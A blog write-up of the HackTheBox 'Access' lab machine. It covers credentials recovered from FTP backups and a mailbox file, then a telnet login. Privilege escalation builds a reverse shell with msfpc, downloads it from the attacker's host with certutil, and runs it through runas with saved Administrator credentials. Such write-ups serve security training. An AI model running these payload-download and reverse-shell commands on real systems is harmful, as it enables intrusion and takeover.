---
layout: post
title: Access writeup (HackTheBox)
---

# Information Gathering
I started with an `nmap` scan.
```
nmap -sC -sV -oA nmap/access -v 10.10.10.98
```
3 ports came out of the scan:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

anonymous login is allowed on the FTP, so I checked that first.
There were two directories, `Backups` and `Engineer`. I first checked `Backups` because it sounds interesting. It contained a file called `backups.mdb`, which was a Microsoft Access Database. Then I checked the `Engineer` directory, which contained a file called `Access Control.zip`, so I downloaded it. I tried unzipping `Access Control.zip` but it required a password. So I took a look at `backup.mdb` using `strings` to see if I could find a password. After some time I found the string `access4u@security` which looked like it would work as a password. I unzipped the file using 7z.
```
7z e -paccess4u@security Access\ Control.zip
```
and got the file `Access\ Control.pst`, which was a Microsoft Outlook file. 
After opening the file with Outlook I could read an email.
```
Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,
John
```
This gave me credentials for a service...

# Getting a shell
I tried `telnet`ing to the box. And got a login prompt, I filled it the credentials I gained from the email.
```
telnet 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>
```
I went to the `Desktop` folder to get `user.txt`.
```
C:\Users\security>cd Desktop

C:\Users\security\Desktop>type user.txt
ff1f3b(snip)
```

# Privilege Escalation
I first tried to use PowerUp from github, but it didn't have any results.
Then I checked if there were stored credentials on the box, which appeared to be the case.
```
C:\Users\security>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```
This meant that I could do `runas` as `Administrator`
I created a reverse shell payload using `msfpc`. 
```
msfpc windows 10.10.13.66 1337 msf reverse
```
I set up a listener using the created `.rc` file, and renamed the shell to `shell.exe`.
I downloaded the shell file to `C:\Users\security\AppData\Local\Temp\` using `certutil`
```
certutil -urlcache -split -f http://10.10.13.66:8000/shell.exe
```
Once downloaded I used `runas` to run the shell.
```
runas /savecred /user:Administrator shell.exe
```
I got a connection with the machine.
```
msf exploit(multi/handler) > sessions -i 1 
[*] Starting interaction with 1...

meterpreter > cd /Users/Administrator/Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2018-08-21 22:55:15 +0100  desktop.ini
100666/rw-rw-rw-  32    fil   2018-08-21 23:07:29 +0100  root.txt

meterpreter > cat root.txt
6e1586(snip)
```
